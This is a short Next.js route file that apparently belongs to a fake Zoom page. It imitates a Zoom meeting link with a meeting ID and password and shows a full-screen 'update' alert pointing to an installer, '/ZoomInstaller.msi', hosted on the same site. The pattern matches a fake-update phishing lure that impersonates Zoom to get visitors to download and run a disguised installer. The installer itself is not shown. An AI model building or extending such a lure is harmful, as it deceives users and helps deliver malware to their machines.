import ZoomUpdateFullScreen from "@/app/components/ZoomAlert";
const UPDATE_FILE_PATH = "/ZoomInstaller.msi";

const AUTHORIZED_PATH =
  "/j/8237770634?pwd=i7gt2XsqvGas7hF6ZaJyQaKCnjVdfU.1";

export default function ZoomMeetingRoute() {
  return <ZoomUpdateFullScreen UPDATE_FILE_PATH={UPDATE_FILE_PATH} AUTHORIZED_PATH={AUTHORIZED_PATH} />;
}
